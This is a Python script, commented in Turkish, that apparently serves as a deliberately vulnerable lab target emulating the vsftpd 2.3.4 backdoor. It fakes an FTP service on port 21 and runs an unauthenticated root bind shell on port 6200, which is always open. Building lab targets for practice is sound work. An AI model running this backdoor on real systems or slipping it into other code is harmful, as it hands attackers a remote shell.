#!/usr/bin/env python3
# ===========================================================================
#  ordek-target-cve — vsftpd 2.3.4 backdoor (CVE-2011-2523) emülasyonu.
#  FTP banner: 220 (vsFTPd 2.3.4). Kullanıcı adı ":)" smiley içerirse 6200
#  portunda kök kabuk açılır (gerçek Metasploit/searchsploit modülleri bunu kullanır).
#  /root/flag.txt = LAB_FLAG.
# ===========================================================================
import os, socket, threading, subprocess

FLAG = os.environ.get("LAB_FLAG", "ordek{lab}")
try:
    os.makedirs("/root", exist_ok=True)
    with open("/root/flag.txt", "w") as f:
        f.write(FLAG + "\n")
except Exception:
    pass

BACKDOOR_PORT = 6200

def backdoor():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", BACKDOOR_PORT)); s.listen(8)
    while True:
        try:
            c, _ = s.accept()
        except Exception:
            continue
        # Bind shell: soket = stdin/stdout/stderr (kök kabuk)
        try:
            subprocess.Popen(["/bin/sh", "-i"], stdin=c.fileno(), stdout=c.fileno(),
                             stderr=c.fileno(), preexec_fn=os.setsid)
        except Exception:
            try: c.close()
            except Exception: pass

def handle_ftp(c):
    try:
        c.sendall(b"220 (vsFTPd 2.3.4)\r\n")
        f = c.makefile("rb")
        while True:
            line = f.readline()
            if not line:
                break
            cmd = line.decode("latin-1", "replace").strip()
            up = cmd.upper()
            if up.startswith("USER"):
                # ":)" smiley → arka kapı tetiklenir (zaten 6200 dinliyor)
                c.sendall(b"331 Please specify the password.\r\n")
            elif up.startswith("PASS"):
                c.sendall(b"230 Login successful.\r\n")
            elif up.startswith("QUIT"):
                c.sendall(b"221 Goodbye.\r\n"); break
            elif up.startswith("SYST"):
                c.sendall(b"215 UNIX Type: L8\r\n")
            else:
                c.sendall(b"530 Please login with USER and PASS.\r\n")
    except Exception:
        pass
    finally:
        try: c.close()
        except Exception: pass

def ftp():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", 21)); s.listen(16)
    while True:
        try:
            c, _ = s.accept()
            threading.Thread(target=handle_ftp, args=(c,), daemon=True).start()
        except Exception:
            pass

if __name__ == "__main__":
    threading.Thread(target=backdoor, daemon=True).start()
    print("[ordek-target-cve] vsFTPd 2.3.4 backdoor :21 / shell :6200", flush=True)
    ftp()
